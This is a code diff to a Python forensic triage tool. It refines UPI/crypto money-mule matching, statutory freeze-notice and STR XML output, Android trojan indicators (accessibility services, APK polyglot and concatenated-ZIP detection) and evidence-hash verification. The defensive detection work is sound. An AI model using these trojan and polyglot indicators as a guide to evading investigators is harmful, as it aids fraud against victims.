                     if (t is not first and id(t) not in used and t["payee_vpa"].lower() == hub
                             and t0 <= t["epoch"] <= last_out and t["payer_vpa"].lower() != hub):
                         inflows.append(t)
@@ -1648,14 +1884,33 @@ class FinancialMuleDetector:
 
     def match_bridges(self, upi_txns: Sequence[Dict[str, Any]], chain_txns: Sequence[Dict[str, Any]]
                       ) -> List[Dict[str, Any]]:
-        """One-to-one greedy match by affinity; requires dt within [-30 s skew, tau_escrow] (affinity >= e^-1)."""
+        """
+        One-to-one greedy match by affinity; requires dt within [-30 s skew, tau_escrow] (affinity >= e^-1).
+        Chain rows are indexed by time, so each UPI row is only scored against chain rows inside its
+        window(s) (the as-recorded one and, for naive timestamps, the IST-shifted one) instead of
+        every chain row (was O(n x m)). Candidates are visited in chain_txns order, so ties sort as before.
+        """
         floor = math.exp(-1.0)
         pairs = []
+        chain_ok = [(float(c["epoch"]), j) for j, c in enumerate(chain_txns)
+                    if _finite(c.get("epoch")) and _finite(c.get("amount_usdt")) and c["amount_usdt"] > 0]
+        chain_ok.sort()
+        c_ep = [e for e, _ in chain_ok]
+        margin = 1.0   # superset; the affinity test below is the exact one
+
+        def near(t: float) -> List[int]:
+            lo = bisect.bisect_left(c_ep, t - self.CLOCK_SKEW_S - margin)
+            hi = bisect.bisect_right(c_ep, t + self.TAU_ESCROW_S + margin)
+            return [j for _, j in chain_ok[lo:hi]]
+
         for u in upi_txns:
-            for c in chain_txns:
-                if not (_finite(u.get("epoch")) and _finite(c.get("epoch")) and _finite(u.get("amount_inr"))
-                        and _finite(c.get("amount_usdt")) and c["amount_usdt"] > 0):
-                    continue
+            if not (_finite(u.get("epoch")) and _finite(u.get("amount_inr"))):
+                continue
+            cand = set(near(float(u["epoch"])))
+            if u.get("tz_naive"):
+                cand.update(near(float(u["epoch"]) - self.IST_OFFSET_S))
+            for j in sorted(cand):
+                c = chain_txns[j]
                 a = self.bridge_affinity(u, c)
                 if a["affinity"] >= floor - 1e-9:
                     pairs.append((a["affinity"], u, c, a))
@@ -1702,6 +1957,9 @@ class FinancialMuleDetector:
     # ----- statutory output ------------------------------------------------ #
 
     FREEZE_FIELDS = ("payee_vpa", "payee_ifsc", "rrn", "amount_inr", "timestamp_utc")
+    FREEZE_NOTICE_STATUS = "PRELIMINARY_TRIAGE_VIEW_SUPERSEDED_BY_SECTOR_D"
+    STR_STATUTE = ("Section 12, Prevention of Money-laundering Act, 2002 read with Rule 8, "
+                   "Prevention of Money-laundering (Maintenance of Records) Rules, 2005")
 
     def build_freeze_notice(self, case_id: str, alert: Dict[str, Any]) -> Dict[str, Any]:
         entries, missing = [], []
@@ -1715,6 +1973,12 @@ class FinancialMuleDetector:
         return {
             "statute": "Section 106, Bharatiya Nagarik Suraksha Sanhita, 2023 - seizure of property; "
                        "I4C CFCFRMS / National Cyber Crime Helpline 1930",
+            # Triage view only: gross credits to first-tier mules, onward legs not netted. The notice to
+            # serve is Sector D's (net tainted balance per account, hub and onward beneficiaries included),
+            # so the two can never stand side by side as conflicting freeze instructions.
+            "notice_status": self.FREEZE_NOTICE_STATUS,
+            "amount_basis": "GROSS_CREDIT_TO_FIRST_TIER_MULES (onward transfers not netted)",
+            "authoritative_notice": "Sector D (sector_d_legal.py) Section 106 BNSS freeze notice",
             "case_reference": case_id,
             "addressee": "Nodal Officers of the beneficiary banks (via CFCFRMS)",
             "victim_inflow": {"rrn": alert["inflow"].get("rrn"), "amount_inr": alert["inflow"].get("amount_inr"),
@@ -1727,26 +1991,46 @@ class FinancialMuleDetector:
     def build_fiu_str_xml(self, case_id: str, alert: Dict[str, Any]) -> str:
         """FINnet 2.0 STR summary for the reporting entity's Principal Officer (not the FIU-IND schema file)."""
         root = ET.Element("STRSummary", {"framework": "FIU-IND FINnet 2.0", "version": "1.0"})
-        ET.SubElement(root, "CaseReference").text = case_id
-        ET.SubElement(root, "Statute").text = ("Section 12, Prevention of Money-laundering Act, 2002 read with "
-                                               "Rule 3, PML (Maintenance of Records) Rules, 2005")
+        ET.SubElement(root, "CaseReference").text = _xml_text(case_id)
+        ET.SubElement(root, "Statute").text = self.STR_STATUTE   # same citation as Sector D's filed STR
         ET.SubElement(root, "SuspicionCategory").text = "RAPID_FAN_OUT_SMURFING"
-        ET.SubElement(root, "GroundsOfSuspicion").text = (
+        ET.SubElement(root, "GroundsOfSuspicion").text = _xml_text(
             f"Inflow of INR {alert['inflow']['amount_inr']:.2f} to {alert['hub_vpa']} dispersed to "
             f"{len(alert['flagged_mules'])} accounts within {alert['dispersal_span_s']} s "
             f"(dispersion ratio {alert['dispersion_ratio']}).")
         accts = ET.SubElement(root, "SuspectAccounts")
-        ET.SubElement(accts, "Account", {"role": "HUB"}).text = alert["hub_vpa"]
+        ET.SubElement(accts, "Account", {"role": "HUB"}).text = _xml_text(alert["hub_vpa"])
         for m in alert["flagged_mules"]:
-            ET.SubElement(accts, "Account", {"role": "MULE"}).text = m
+            ET.SubElement(accts, "Account", {"role": "MULE"}).text = _xml_text(m)
         txs = ET.SubElement(root, "Transactions")
         for t in [alert["inflow"]] + alert["outflows"]:
             tx = ET.SubElement(txs, "Transaction")
             for tag, key in (("RRN", "rrn"), ("DateTimeUTC", "timestamp_utc"), ("PayerVPA", "payer_vpa"),
                              ("PayeeVPA", "payee_vpa"), ("PayeeIFSC", "payee_ifsc")):
-                ET.SubElement(tx, tag).text = str(t.get(key) or "")
+                ET.SubElement(tx, tag).text = _xml_text(str(t.get(key) or ""))
             ET.SubElement(tx, "Amount", {"currency": "INR"}).text = f"{t.get('amount_inr', 0):.2f}"
         return ET.tostring(root, encoding="unicode")
+
+
+_XML_ILLEGAL = re.compile("[\x00-\x08\x0b\x0c\x0e-\x1f\ud800-\udfff\ufffe\uffff]")
+
+
+def _xml_text(s: Any) -> str:
+    """Text safe for XML 1.0: control characters and lone surrogates become U+FFFD (ElementTree passes them through)."""
+    return _XML_ILLEGAL.sub("\ufffd", str(s))
+
+
+def str_xml_check(xml_text: str) -> List[str]:
+    """Problems that keep a generated STR XML from being filed: not well-formed, or a field had to be repaired."""
+    problems = []
+    try:
+        ET.fromstring(xml_text)
+    except ET.ParseError as exc:
+        problems.append(f"STR XML not well-formed: {exc}")
+    if "\ufffd" in xml_text:
+        problems.append("a field contained XML-illegal or undecodable characters (shown as U+FFFD); "
+                        "correct the source row before filing")
+    return problems
 
 
 def _txn_view(t: Dict[str, Any]) -> Dict[str, Any]:
@@ -1834,39 +2118,78 @@ class AndroidTrojanTriageEngine:
 
     # ----- Mode 1: rooted /data/system/packages.xml ------------------------ #
 
-    @staticmethod
-    def parse_packages_xml(data: bytes) -> Dict[str, Dict[str, Any]]:
-        """Rooted /data/system/packages.xml (text form). Each package keeps the byte extent of its own element."""
+    _XML_TAG_STOP = re.compile(rb"[\"'>]")
+
+    @classmethod
+    def _xml_tag_end(cls, data: bytes, start: int) -> int:
+        """End (exclusive) of the tag opening at start; '>' inside a quoted attribute value does not end it."""
+        pos = start
+        while True:
+            m = cls._XML_TAG_STOP.search(data, pos)
+            if m is None:
+                return len(data)
+            if m.group(0) == b">":
+                return m.end()
+            close = data.find(m.group(0), m.end())
+            if close < 0:
+                return len(data)
+            pos = close + 1
+
+    @classmethod
+    def parse_packages_xml(cls, data: bytes) -> Dict[str, Dict[str, Any]]:
+        """
+        Rooted /data/system/packages.xml (text form). Each package keeps the byte extent of its own
+        element, taken from the same expat parse that reads its permissions (CurrentByteIndex), so a
+        <package> inside a comment or CDATA cannot take the anchor and no regex rescans the file.
+        """
         if data[:4] == b"ABX\x00":
             raise ValueError("packages.xml is Android Binary XML (ABX); convert with `abx2xml` first")
-        root = ET.fromstring(data)
-        extents: Dict[str, Tuple[int, int]] = {}
-        for m in re.finditer(rb"<package\b[^>]*?\sname=\"([^\"]+)\"[^>]*?(/?)>", data):
-            name = m.group(1).decode("utf-8", "replace")
-            if m.group(2) == b"/":
-                end = m.end()
+        if data[:2] in (b"\xff\xfe", b"\xfe\xff"):
+            raise ValueError("packages.xml is UTF-16; convert to UTF-8 so byte anchors stay exact")
+        parser = xml.parsers.expat.ParserCreate()
+        stack: List[Optional[Dict[str, Any]]] = []
+        pkgs: Dict[str, Dict[str, Any]] = {}
+
+        def start(tag: str, attrs: Dict[str, str]) -> None:
+            if tag == "package":
+                begin = parser.CurrentByteIndex
+                stack.append({"name": attrs.get("name"), "permissions": set(), "installer": attrs.get("installer"),
+                              "code_path": attrs.get("codePath"), "first_install": attrs.get("it"),
+                              "begin": begin, "tag_end": cls._xml_tag_end(data, begin)})
+                return
+            if tag == "item" and attrs.get("granted", "true") != "false":
+                for open_pkg in stack:   # same as Element.iter("item") under every enclosing <package>
+                    if open_pkg is not None:
+                        open_pkg["permissions"].add(attrs.get("name", "").rsplit(".", 1)[-1])
+            stack.append(None)
+
+        def end(tag: str) -> None:
+            p = stack.pop()
+            if p is None or not p["name"]:
+                return
+            if data[p["tag_end"] - 2:p["tag_end"]] == b"/>":
+                stop = p["tag_end"]                       # <package ... />
             else:
-                close = data.find(b"</package>", m.end())
-                end = close + len(b"</package>") if close >= 0 else m.end()
-            extents.setdefault(name, (m.start(), end))
-        pkgs = {}
-        for p in root.iter("package"):
-            name = p.get("name")
-            if not name or name not in extents:
-                continue
-            perms = {i.get("name", "").rsplit(".", 1)[-1] for i in p.iter("item")
-                     if i.get("granted", "true") != "false"}
-            start, end = extents[name]
-            pkgs[name] = {"package": name, "permissions": perms, "installer": p.get("installer"),
-                          "code_path": p.get("codePath"), "first_install": p.get("it"),
-                          "byte_offset": start, "end_offset": end}
+                close = parser.CurrentByteIndex           # start of </package>
+                gt = data.find(b">", close)
+                stop = gt + 1 if gt >= 0 else len(data)
+            pkgs[p["name"]] = {"package": p["name"], "permissions": p["permissions"], "installer": p["installer"],
+                               "code_path": p["code_path"], "first_install": p["first_install"],
+                               "byte_offset": p["begin"], "end_offset": stop}
+
+        parser.StartElementHandler = start
+        parser.EndElementHandler = end
+        parser.Parse(data, True)
         return pkgs
 
     @staticmethod
     def parse_secure_settings(data: bytes) -> Dict[str, List[str]]:
         """`settings get secure ...` output (key=value lines) or settings_secure.xml."""
         out = {"enabled_accessibility_services": [], "enabled_notification_listeners": []}
-        text = data.decode("utf-8", "replace")
+        if data[:2] == b"\xff\xfe":   # Windows PowerShell 5.1 '>' redirect of `adb shell settings ...`
+            text = data[2:].decode("utf-16-le", "replace")
+        else:
+            text = data.decode("utf-8-sig", "replace")
         for key in out:
             vals = re.findall(rf'name="{key}"\s+value="([^"]*)"', text) + re.findall(rf"^{key}=(.*)$", text, re.M)
             for v in vals:
@@ -2034,6 +2357,33 @@ class AndroidTrojanTriageEngine:
             pos += cls.TAIL_SCAN
         return None
 
+    @staticmethod
+    def _archive_data_start(read_at: Any, size: int, eocd: int) -> Optional[Tuple[int, int]]:
+        """
+        (base, entry) from the end record, or None if it cannot be trusted: base = cd_start - cd_offset
+        (where the archive's own offsets count from; > 0 means data was prepended without adjusting
+        them) and entry = the local header of the first central-directory entry.
+        """
+        if eocd < 0 or eocd + 22 > size:
+            return None
+        rec = read_at(eocd, 22)
+        if len(rec) < 22:
+            return None
+        cd_size, cd_offset = struct.unpack_from("<II", rec, 12)
+        if 0xFFFFFFFF in (cd_size, cd_offset) or cd_size == 0:
+            return None   # ZIP64 or empty archive: keep the head search
+        cd_start = eocd - cd_size
+        base = cd_start - cd_offset
+        if cd_start < 0 or base < 0:
+            return None
+        cdh = read_at(cd_start, 46)
+        if len(cdh) < 46 or cdh[:4] != b"PK\x01\x02":
+            return None
+        start = base + struct.unpack_from("<I", cdh, 42)[0]
+        if start < 0 or start + 4 > size or read_at(start, 4) != b"PK\x03\x04":
+            return None
+        return base, start
+
     @classmethod
     def analyze_apk_source(cls, read_at: Any, size: int) -> Dict[str, Any]:
         """
@@ -2046,10 +2396,28 @@ class AndroidTrojanTriageEngine:
         first_lfh = head.find(b"PK\x03\x04")
         prefix = {b"\xff\xd8\xff": "JPEG", b"\x89PNG": "PNG", b"GIF8": "GIF", b"%PDF": "PDF"}
         magic = next((v for k, v in prefix.items() if head.startswith(k)), None)
-        if first_lfh > 0:
-            findings.append({"finding": f"{magic}_ZIP_POLYGLOT" if magic else "PREPENDED_DATA_BEFORE_ZIP",
-                             "byte_offset": 0, "length": first_lfh, "weight": 0.85 if magic else 0.60})
         eocd = cls._rfind_stream(read_at, size, b"PK\x05\x06")
+        # Where the archive really starts, from its own end record (what Android's installer reads):
+        # central directory at eocd - cd_size, entry offsets relative to cd_start - cd_offset, first
+        # entry at that base + its local-header offset. This finds a prefix of any length (a 5 MB
+        # JPEG hides the first local header from a HEAD_SCAN search) and an appended second ZIP.
+        structural = cls._archive_data_start(read_at, size, eocd)
+        if structural is not None:
+            base, entry = structural
+            if base > 0:     # offsets count from 'base': everything before it was prepended / concatenated
+                first_lfh = base if read_at(base, 4) == b"PK\x03\x04" else entry
+            elif first_lfh < 0:   # absolute offsets and a prefix longer than HEAD_SCAN
+                first_lfh = entry
+            # base == 0 with a header found at the head: keep it, so a central directory listed in a
+            # different order from the local headers is not mistaken for prepended data
+        if first_lfh > 0:
+            earlier_eocd = cls._rfind_stream(read_at, first_lfh, b"PK\x05\x06")
+            if earlier_eocd >= 0 and not magic:
+                findings.append({"finding": "CONCATENATED_ZIP", "byte_offset": 0, "length": first_lfh,
+                                 "earlier_end_record_offset": earlier_eocd, "weight": 0.85})
+            else:
+                findings.append({"finding": f"{magic}_ZIP_POLYGLOT" if magic else "PREPENDED_DATA_BEFORE_ZIP",
+                                 "byte_offset": 0, "length": first_lfh, "weight": 0.85 if magic else 0.60})
         zip_end = None
         if eocd >= 0 and eocd + 22 <= size:
             rec = read_at(eocd, 22)
@@ -2103,17 +2471,40 @@ class SutraNeuralTriageOrchestrator:
         self.apk_engine = AndroidTrojanTriageEngine()
         self.artifacts: Dict[str, Dict[str, Any]] = {}
         self.sector_a: Optional[Dict[str, Any]] = None
+        self._sector_a_bad: Tuple[List[int], int, Optional[str]] = ([], 4096, None)
         self._cache: Dict[str, bytes] = {}
 
     # ----- inputs ---------------------------------------------------------- #
 
+    VERIFY_BOUND_IMAGE = True   # re-hash the bound evidence image once per run and compare with Sector A
+
     def bind_sector_a_manifest(self, manifest: Any) -> Dict[str, Any]:
-        """Bind triage to a Sector A evidence_manifest.json (dict or path)."""
+        """
+        Bind triage to a Sector A evidence_manifest.json (dict or path). The manifest's canonical digest
+        is re-computed with Sector A's own canonical JSON (as Sector C does), so an edited manifest is
+        refused instead of being copied into sector_a_binding. run() later re-hashes the registered
+        image against sha256_linear_primary (sector_a_binding.image_digest).
+        """
         if isinstance(manifest, str):
             with open(manifest, "r", encoding="utf-8") as f:
                 manifest = json.load(f)
+        if not isinstance(manifest, dict):
+            raise ValueError("Sector A manifest is not a JSON object")
+        digest_status = "UNVERIFIED (sector_a_vault.py not found beside this file)"
+        canon = getattr(_sector_a, "_canonical_json", None)
+        if canon is not None:
+            body = {k: v for k, v in manifest.items() if k != "manifest_canonical_sha256"}
+            if hashlib.sha256(canon(body)).hexdigest() != manifest.get("manifest_canonical_sha256"):
+                raise ValueError("evidence_manifest.json canonical digest mismatch (manifest altered)")
+            digest_status = "VERIFIED"
         h = manifest.get("cryptographic_hashes", {})
         media = manifest.get("evidence_media", {})
+        bsm = manifest.get("bad_sector_manifest") or {}
+        try:
+            self._sector_a_bad = (sorted({int(b) for b in bsm.get("bad_sectors") or []}),
+                                  int(bsm.get("sector_size_bytes") or 4096), h.get("sha256_piecewise_valid_extent"))
+        except (TypeError, ValueError):
+            self._sector_a_bad = ([], 4096, None)
         self.sector_a = {
             "vault_version": manifest.get("version"),
             "evidence_id": manifest.get("evidence_id"),
@@ -2123,6 +2514,9 @@ class SutraNeuralTriageOrchestrator:
             "sha256_linear_primary": h.get("sha256_linear_primary") or h.get("sha256_primary"),
             "master_case_root_v3": h.get("master_case_root_v3"),
             "admissibility_status": (manifest.get("admissibility") or {}).get("status"),
+            "manifest_canonical_sha256": manifest.get("manifest_canonical_sha256"),
+            "manifest_digest": digest_status,
+            "image_digest": "UNVERIFIED (run() not executed yet)",
         }
         if self.sector_a["case_reference"] and self.sector_a["case_reference"] != self.case_id:
             raise ValueError(f"Sector A manifest is for {self.sector_a['case_reference']}, not {self.case_id}")
@@ -2139,16 +2533,30 @@ class SutraNeuralTriageOrchestrator:
             raise ValueError(f"unknown artifact kind {kind!r}")
         if (data is None) == (path is None):
             raise ValueError("give exactly one of data or path")
-        if path is not None and length is None:
-            length = os.path.getsize(path) - base_offset
+        if path is not None:
+            size = os.path.getsize(path)
+            if length is None:
+                length = size - base_offset
+            if (not isinstance(base_offset, int) or not isinstance(length, int) or isinstance(base_offset, bool)
+                    or isinstance(length, bool) or base_offset < 0 or length < 0 or base_offset + length > size):
+                raise ValueError(f"extent {base_offset}+{length} of artifact {artifact_id!r} is outside "
+                                 f"{os.path.basename(path)} ({size} bytes)")
         self.artifacts[artifact_id] = {"kind": kind, "source_type": source_type, "data": data, "path": path,
                                        "base": base_offset if path else 0,
                                        "length": len(data) if data is not None else length, "meta": meta}
 
-    MAX_INMEMORY_BYTES = 512 * 1024 * 1024  # largest text/trace artifact parsed in RAM
+    # Largest artifact parsed whole in RAM. Parsing amplifies text 5-8x (decoded lines, event dicts), so
+    # the cap keeps one artifact well inside the 422 MB laptop budget of the whole pipeline; a larger
+    # log is reported in artifact_errors and should be registered as smaller extents.
+    MAX_INMEMORY_BYTES = 48 * 1024 * 1024
+    # Kinds whose parse keeps little beyond the raw bytes (a bugreport is regex-split and only three
+    # sections are parsed) may be larger; real bugreport .txt files are often 30-100 MB.
+    MAX_INMEMORY_BY_KIND = {"bugreport": 128 * 1024 * 1024}
     HASH_CHUNK = 4 * 1024 * 1024
 
     def _read_range(self, art: Dict[str, Any], off: int, length: int) -> bytes:
+        if length <= 0 or off < 0:
+            return b""
         if art["data"] is not None:
             return art["data"][off:off + length]
         with open(art["path"], "rb") as f:
@@ -2156,16 +2564,26 @@ class SutraNeuralTriageOrchestrator:
             return f.read(length)
 
     def _load(self, aid: str) -> bytes:
-        """Whole-artifact bytes for parsers that need them, loaded once per run and size-capped."""
+        """
+        Whole-artifact bytes for parsers that need them, size-capped. Only the artifact being parsed is
+        cached (several large artifacts never accumulate), and a short read (file truncated after
+        registration) is an error, never a silently shorter parse.
+        """
         if aid not in self._cache:
             art = self.artifacts[aid]
-            if art["length"] > self.MAX_INMEMORY_BYTES:
-                raise MemoryError(f"artifact is {art['length']} bytes; parse limit is {self.MAX_INMEMORY_BYTES}. "
+            cap = max(self.MAX_INMEMORY_BYTES, self.MAX_INMEMORY_BY_KIND.get(art["kind"], 0))
+            if art["length"] > cap:
+                raise MemoryError(f"artifact is {art['length']} bytes; parse limit is {cap}. "
                                   "Register the relevant extent instead of the whole image.")
-            self._cache[aid] = self._read_range(art, 0, art["length"])
+            self._cache = {}
+            data = self._read_range(art, 0, art["length"])
+            if len(data) != art["length"]:
+                raise ValueError(f"TRUNCATED: expected {art['length']} bytes, read {len(data)}")
+            self._cache = {aid: data}
         return self._cache[aid]
 
     def _artifact_sha256(self, art: Dict[str, Any]) -> str:
+        """SHA-256 of the registered extent; raises OSError if unreadable and ValueError on a short read."""
         h = hashlib.sha256()
         if art["data"] is not None:
             h.update(art["data"])
@@ -2176,10 +2594,86 @@ class SutraNeuralTriageOrchestrator:
             while left > 0:
                 chunk = f.read(min(self.HASH_CHUNK, left))
                 if not chunk:
-                    break
+                    raise ValueError(f"TRUNCATED: expected {art['length']} bytes, read {art['length'] - left}")
                 h.update(chunk)
                 left -= len(chunk)
         return h.hexdigest()
+
+    def _image_digests(self, path: str) -> Tuple[str, Optional[str]]:
+        """(linear SHA-256, SHA-256 of the bytes outside Sector A's bad sectors) of a file, in one pass."""
+        bad, ss, _ = self._sector_a_bad
+        lin, valid = hashlib.sha256(), hashlib.sha256()
+        bad_set = set(bad)
+        pos = 0
+        with open(path, "rb") as f:
+            while True:
+                chunk = f.read(self.HASH_CHUNK)
+                if not chunk:
+                    break
+                lin.update(chunk)
+                if bad_set:
+                    mv = memoryview(chunk)
+                    i = 0
+                    while i < len(chunk):
+                        sec = (pos + i) // ss
+                        j = min(len(chunk), (sec + 1) * ss - pos)
+                        if sec not in bad_set:
+                            valid.update(mv[i:j])
+                        i = j
+                pos += len(chunk)
+        return lin.hexdigest(), (valid.hexdigest() if bad_set else None)
+
+    def _verify_bound_image(self, errors: List[Dict[str, Any]]) -> str:
+        """
+        Re-hash each registered file that is the Sector A evidence (same file name or size) and compare
+        with sha256_linear_primary (or, when Sector A recorded bad sectors, the valid-extent digest).
+        Returns VERIFIED / VERIFIED_VALID_EXTENT / MISMATCH / UNREADABLE / UNVERIFIED (...); a mismatch
+        is also an INTEGRITY_FAILURE artifact error and an unreadable image an UNREADABLE one.
+        """
+        a = self.sector_a
+        if not a or not a.get("sha256_linear_primary"):
+            return "UNVERIFIED (no Sector A digest bound)"
+        if not self.VERIFY_BOUND_IMAGE:
+            return "UNVERIFIED (verification disabled)"
+        want_name = os.path.basename(str(a.get("evidence_filename") or "")).lower()
+        want_size = a.get("evidence_size_bytes")
+        files: Dict[str, List[str]] = defaultdict(list)
+        for aid, art in sorted(self.artifacts.items()):
+            if art["path"] is None:
+                continue
+            try:
+                size = os.path.getsize(art["path"])
+            except OSError:
+                size = None
+            if (want_name and os.path.basename(art["path"]).lower() == want_name) or \
+                    (want_size is not None and size == want_size):
+                files[os.path.realpath(art["path"])].append(aid)
+        if not files:
+            return "UNVERIFIED (Sector A image not registered as a file)"
+        statuses = []
+        for real, aids in sorted(files.items()):
+            try:
+                linear, valid = self._image_digests(real)
+            except OSError as exc:   # moved, deleted or locked (Windows sharing violation): not verified
+                errors.append({"artifact_id": aids[0],
+                               "error": f"UNREADABLE: bound image could not be re-hashed against Sector A: "
+                                        f"{type(exc).__name__}: {exc}"[:300]})
+                statuses.append("UNREADABLE")
+                continue
+            if linear == a["sha256_linear_primary"]:
+                statuses.append("VERIFIED")
+            elif valid is not None and valid == self._sector_a_bad[2]:
+                statuses.append("VERIFIED_VALID_EXTENT")
+            else:
+                statuses.append("MISMATCH")
+                errors.append({"artifact_id": aids[0],
+                               "error": f"INTEGRITY_FAILURE: {os.path.basename(real)} SHA-256 {linear[:16]}... does "
+                                        f"not match Sector A sha256_linear_primary {str(a['sha256_linear_primary'])[:16]}... "
+                                        f"(artifacts {', '.join(aids)})"[:300]})
+        for worst in ("MISMATCH", "UNREADABLE"):
+            if worst in statuses:
+                return worst
+        return "VERIFIED" if all(st == "VERIFIED" for st in statuses) else "VERIFIED_VALID_EXTENT"
 
     # ----- anchoring ------------------------------------------------------- #
 
@@ -2210,21 +2704,36 @@ class SutraNeuralTriageOrchestrator:
 
     @staticmethod
     def verify_anchor(anchor: Dict[str, Any], source: Any) -> bool:
-        """Re-hash an anchor from bytes or a file path (absolute offsets). Independent of the engines."""
-        off, length = anchor["byte_offset"], anchor["length"]
-        if isinstance(source, (bytes, bytearray)):
+        """
+        Re-hash an anchor from bytes or a file path (absolute offsets). Independent of the engines.
+        Never raises: a malformed anchor (non-integer, negative or zero-length range, sha256 that is not
+        64 lowercase hex digits), a range past the end of the source, or an unreadable file is False.
+        """
+        if not isinstance(anchor, dict):
+            return False
+        off, length, digest = anchor.get("byte_offset"), anchor.get("length"), anchor.get("sha256")
+        if (not isinstance(off, int) or isinstance(off, bool) or not isinstance(length, int)
+                or isinstance(length, bool) or off < 0 or length <= 0
+                or not isinstance(digest, str) or not re.fullmatch(r"[0-9a-f]{64}", digest)):
+            return False
+        if isinstance(source, (bytes, bytearray, memoryview)):
             chunk = bytes(source[off:off + length])
-            return len(chunk) == length and _sha256_hex(chunk) == anchor["sha256"]
+            return len(chunk) == length and _sha256_hex(chunk) == digest
         h, got = hashlib.sha256(), 0
-        with open(source, "rb") as f:
-            f.seek(off)
-            while got < length:
-                chunk = f.read(min(4 * 1024 * 1024, length - got))
-                if not chunk:
-                    return False
-                h.update(chunk)
-                got += len(chunk)
-        return h.hexdigest() == anchor["sha256"]
+        try:
+            if off + length > os.path.getsize(source):
+                return False
+            with open(source, "rb") as f:
+                f.seek(off)
+                while got < length:
+                    chunk = f.read(min(4 * 1024 * 1024, length - got))
+                    if not chunk:
+                        return False
+                    h.update(chunk)
+                    got += len(chunk)
+        except (OSError, TypeError, ValueError):
+            return False
+        return h.hexdigest() == digest
 
     # ----- run ------------------------------------------------------------- #
 
@@ -2239,8 +2748,28 @@ class SutraNeuralTriageOrchestrator:
         raw: List[Dict[str, Any]] = []
         errors: List[Dict[str, Any]] = []
         by_kind: Dict[str, List[str]] = defaultdict(list)
+        # A file moved, deleted, locked (Windows sharing violation) or truncated since registration is a
+        # tripwire in artifact_errors, and the artifact is not parsed: never a traceback, never a parse of
+        # fewer bytes than were registered.
+        unavailable: Dict[str, str] = {}
         for aid, a in sorted(self.artifacts.items()):
-            by_kind[a["kind"]].append(aid)
+            if a["path"] is None:
+                continue
+            try:
+                size = os.path.getsize(a["path"])
+            except OSError as exc:
+                unavailable[aid] = "UNREADABLE"
+                errors.append({"artifact_id": aid, "error": f"UNREADABLE: {type(exc).__name__}: {exc}"[:300]})
+                continue
+            if a["base"] + a["length"] > size:
+                unavailable[aid] = "TRUNCATED"
+                errors.append({"artifact_id": aid, "error": f"TRUNCATED: extent {a['base']}+{a['length']} ends "
+                                                            f"beyond the file's {size} bytes"})
+        for aid, a in sorted(self.artifacts.items()):
+            if aid not in unavailable:
+                by_kind[a["kind"]].append(aid)
+        if self.sector_a is not None:
+            self.sector_a["image_digest"] = self._verify_bound_image(errors)
         scanned = 0
 
         def guarded(aid: str, fn, *args):
@@ -2254,10 +2783,12 @@ class SutraNeuralTriageOrchestrator:
         all_events: List[Dict[str, Any]] = []
         log_leads = []
         for aid in by_kind["process_events_jsonl"]:
-            evs = guarded(aid, lambda a: self.log_engine.parse_events_jsonl(self._load(a)), aid) or []
+            errs: List[str] = []
+            evs = guarded(aid, lambda a: self.log_engine.parse_events_jsonl(self._load(a), errs), aid) or []
             scanned += len(evs)
             all_events.extend(evs)
-            log_leads.extend(guarded(aid, self.log_engine.triage_events, evs, aid, self.lead_threshold) or [])
+            log_leads.extend(guarded(aid, self.log_engine.triage_events, evs, aid, self.lead_threshold, errs) or [])
+            errors.extend({"artifact_id": aid, "error": e} for e in errs)
 
         anydesk_sessions = []
         ist_like = datetime.timezone(datetime.timedelta(minutes=self.log_utc_offset_minutes))
@@ -2274,16 +2805,20 @@ class SutraNeuralTriageOrchestrator:
                         pass
 
         exculpatory = None
+        top = None
         if log_leads:
             top = max(log_leads, key=lambda l: (l["score"], -l["ref"]["byte_offset"]))
             if top["event"].get("timestamp"):
                 exculpatory = guarded(top["ref"]["artifact_id"], self.log_engine.section45_exculpatory_checklist,
                                       top["event"], all_events, self.device_owner)
-                if exculpatory:
-                    exculpatory["evaluated_for_lead_offset"] = top["ref"]["byte_offset"]
+                if exculpatory:   # absolute offset, like every lead anchor; lead id filled in after anchoring
+                    t_aid = top["ref"]["artifact_id"]
+                    exculpatory["evaluated_for_lead_id"] = None
+                    exculpatory["evaluated_for_lead_artifact_id"] = t_aid
+                    exculpatory["evaluated_for_lead_offset"] = self.artifacts[t_aid]["base"] + top["ref"]["byte_offset"]
         for l in log_leads:
             raw.append({"family": "LOG", "category": l["category"], "score": l["score"], "mitre": l["mitre"],
-                        "details": dict(l["details"]), "ref": l["ref"]})
+                        "details": dict(l["details"]), "ref": l["ref"], "s45_target": l is top})
 
         # --- Sector B.2: media / call artifacts
         requisitions_by_call: Dict[Optional[str], List[Dict[str, Any]]] = defaultdict(list)
@@ -2298,8 +2833,24 @@ class SutraNeuralTriageOrchestrator:
                 errors.append({"artifact_id": aid, "error": e})
             compressed = data[:2] == b"\x1f\x8b"
             scanned += len(parsed["candidates"])
+            servers = []   # STUN/TURN lines: absolute anchors (or decompressed offsets for .gz), like candidates
+            for sv in parsed["stun_turn_servers"]:
+                entry = {"scheme": sv["scheme"], "host": sv["host"], "port": sv["port"], "artifact_id": aid}
+                if compressed:
+                    entry.update(decompressed_byte_offset=sv["byte_offset"], decompressed_length=sv["length"],
+                                 decompressed_line_sha256=sv["line_sha256"])
+                else:
+                    try:
+                        an = self._anchor(evidence_ref(aid, sv["byte_offset"], sv["length"]))
+                        entry.update({k: an[k] for k in ("file_path", "offset_basis", "byte_offset", "length", "sha256")
+                                      if k in an})
+                    except (ValueError, OSError):
+                        entry["line_offset_in_artifact"] = sv["byte_offset"]
+                servers.append(entry)
             for c in self.media_engine.requisition_targets(parsed):
-                req = self.media_engine.build_sec94_requisition(self.case_id, c)
+                req = guarded(aid, self.media_engine.build_sec94_requisition, self.case_id, c)
+                if req is None:
+                    continue
                 requisitions_by_call[c.get("call_id")].append(req)
                 if compressed:  # anchor the .gz as seized; locate the line inside the decompressed text
                     ref = evidence_ref(aid, 0, len(data), session_id=c.get("call_id"),
@@ -2310,9 +2861,9 @@ class SutraNeuralTriageOrchestrator:
                 raw.append({"family": "MEDIA", "category": "WEBRTC_PEER_ENDPOINT", "score": 0.78, "mitre": None,
                             "details": {"candidate": {k: v for k, v in c.items()
                                                       if k not in ("byte_offset", "length", "line_sha256")},
-                                        "stun_turn_servers": parsed["stun_turn_servers"]},
+                                        "stun_turn_servers": servers},
                             "ref": ref,
-                            "statutory": {"bnss_sec_94_requisition_ready": c.get("timestamp_utc") is not None,
+                            "statutory": {"bnss_sec_94_requisition_ready": req.get("query_window_utc") is not None,
                                           "target_ip": c["ip"], "cgnat_port": c["port"], "requisition": req}})
         for aid in by_kind["rppg_trace"]:
             tr = guarded(aid, lambda a: unpack_rppg_trace(self._load(a)), aid)
